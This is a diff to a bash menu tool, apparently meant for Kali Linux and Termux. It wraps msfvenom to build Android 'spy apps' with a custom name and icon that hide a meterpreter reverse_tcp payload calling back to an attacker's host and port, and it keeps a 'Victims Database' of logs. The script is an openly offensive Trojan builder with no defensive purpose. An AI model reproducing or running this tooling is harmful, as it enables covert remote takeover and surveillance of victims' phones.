@@ -1,9 +1,8 @@
 cat << 'EOF' > xxszmsx.sh
 #!/bin/bash
 # =====================================================
-# TOOL: XXSZMSX (UNIVERSAL EDITION)
-# COMPATIBILITY: KALI LINUX & TERMUX (ANDROID)
-# DEVELOPER: STUDIO
+# TOOL: XXSZMSX (FIXED INTERFACE)
+# COMPATIBILITY: KALI LINUX & TERMUX
 # =====================================================
 
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
@@ -23,7 +22,6 @@ fi
 clear
 echo -e "${RED}====================================================="
 echo -e "         XXSZMSX SYSTEM - SECURE ACCESS             "
-echo -e "         DETECTED OS: $OS                          "
 echo -e "=====================================================${NC}"
 read -p "[+] Username: " username
 read -s -p "[+] Password: " password
@@ -37,15 +35,15 @@ fi
 while true; do
     clear
     echo -e "${RED}"
-    echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
-    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
-    echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
-    echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
-    echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
-    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
-    echo "                [ X X S Z M S X ] - [ $OS ]"
+    echo "  __  __  __  __  ____  _____  __  __  ____  __  __ "
+    echo "  \ \/ /  \ \/ / / ___||__  / |  \/  |/ ___| \ \/ / "
+    echo "   \  /    \  /  \___ \  / /  | |\/| |\___ \  \  /  "
+    echo "   /  \    /  \   ___) |/ /_  | |  | | ___) | /  \  "
+    echo "  /_/\_\  /_/\_\ |____//____| |_|  |_||____/ /_/\_\ "
+    echo "                                                     "
+    echo "                [ X X S Z M S X ]                    "
     echo -e "${YELLOW}-------------------------------------------------------------${NC}"
-    echo -e "  USER: $username          |    STORAGE: $SAVE_DIR"
+    echo -e "  USER: $username          |    OS: $OS"
     echo -e "-------------------------------------------------------------"
     echo -e " 1) Build Spy App (Custom Name & Icon)"
     echo -e " 2) Victims Database (Logs)"
@@ -56,21 +54,16 @@ while true; do
 
     case $choice in
         1) 
-           read -p "[+] Enter App Name (e.g. Facebook): " app_name
+           read -p "[+] Enter App Name: " app_name
            read -p "[+] Enter Icon URL: " icon_url
            read -p "[+] Enter LHOST (IP): " lh
            read -p "[+] Enter LPORT (Port): " lp
-           
            echo "$lh:$lp" > "$DB_FILE"
            echo "[$(date +%Y-%m-%d_%H:%M)] App: $app_name | IP: $lh | Port: $lp" >> "$LOG_FILE"
-           
            echo -e "${YELLOW}[*] Downloading Icon...${NC}"
            curl -s "$icon_url" -o icon.png
-           
            echo -e "${YELLOW}[*] Building $app_name.apk...${NC}"
-           # إذا كان كالي سيحتاج sudo في بعض الأحيان
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_DIR/$app_name.apk"
-           
            echo -e "${GREEN}[+] Success! Saved to: $SAVE_DIR/$app_name.apk${NC}" ;;
         2)
            clear
@@ -91,4 +84,3 @@ while true; do
     echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
 done
 EOF
-
